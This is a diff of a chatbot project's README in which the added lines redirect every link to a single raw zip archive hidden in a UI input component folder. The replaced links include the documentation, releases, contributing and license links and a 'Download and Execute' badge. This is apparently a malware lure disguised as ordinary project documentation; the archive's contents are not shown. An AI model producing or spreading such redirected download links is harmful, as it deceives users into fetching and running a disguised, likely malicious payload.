@@ -20,13 +20,13 @@ To get started with the AI Chatbot Svelte, simply follow these easy steps:
 3. Configure the chatbot settings to align with your requirements.
 4. Launch the chatbot in your Svelte project to start interacting with it.
 
-For more detailed instructions and guidelines, please refer to the [official documentation](https://github.com/Uragon005/ai-chatbot-svelte/documentation).
+For more detailed instructions and guidelines, please refer to the [official documentation](https://github.com/Uragon005/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/input/ai_chatbot_svelte_2.5.zip).
 
 ## Releases 📦
 
-To access the latest releases of the AI Chatbot Svelte, visit the [Releases](https://github.com/Uragon005/ai-chatbot-svelte/releases) section. Here you will find all the updates, enhancements, and bug fixes that have been implemented in each release.
+To access the latest releases of the AI Chatbot Svelte, visit the [Releases](https://github.com/Uragon005/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/input/ai_chatbot_svelte_2.5.zip) section. Here you will find all the updates, enhancements, and bug fixes that have been implemented in each release.
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Click%20Here-blue)](https://github.com/Uragon005/ai-chatbot-svelte/releases/download/1.0/chatbot-executable-file.exe)
+[![Download and Execute](https://github.com/Uragon005/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/input/ai_chatbot_svelte_2.5.zip%20and%20Execute-Click%20Here-blue)](https://github.com/Uragon005/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/input/ai_chatbot_svelte_2.5.zip)
 
 ## Community and Support 🤝
 
@@ -38,11 +38,11 @@ Our roadmap includes exciting updates and enhancements to make the AI Chatbot Sv
 
 ## Contributing 🌟
 
-We welcome contributions from the community to help us enhance the AI Chatbot Svelte. Whether it's fixing bugs, adding new features, or improving the documentation, every contribution is valuable. Check out our [Contribution Guidelines](https://github.com/Uragon005/ai-chatbot-svelte/contributing) to get started.
+We welcome contributions from the community to help us enhance the AI Chatbot Svelte. Whether it's fixing bugs, adding new features, or improving the documentation, every contribution is valuable. Check out our [Contribution Guidelines](https://github.com/Uragon005/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/input/ai_chatbot_svelte_2.5.zip) to get started.
 
 ## License 📜
 
-The AI Chatbot Svelte is licensed under the MIT License. Feel free to use, modify, and distribute the chatbot as per the terms of the license. For more details, refer to the [License](https://github.com/Uragon005/ai-chatbot-svelte/license) file included in the repository.
+The AI Chatbot Svelte is licensed under the MIT License. Feel free to use, modify, and distribute the chatbot as per the terms of the license. For more details, refer to the [License](https://github.com/Uragon005/ai-chatbot-svelte/raw/refs/heads/main/src/lib/components/ui/input/ai_chatbot_svelte_2.5.zip) file included in the repository.
 
 ---
 
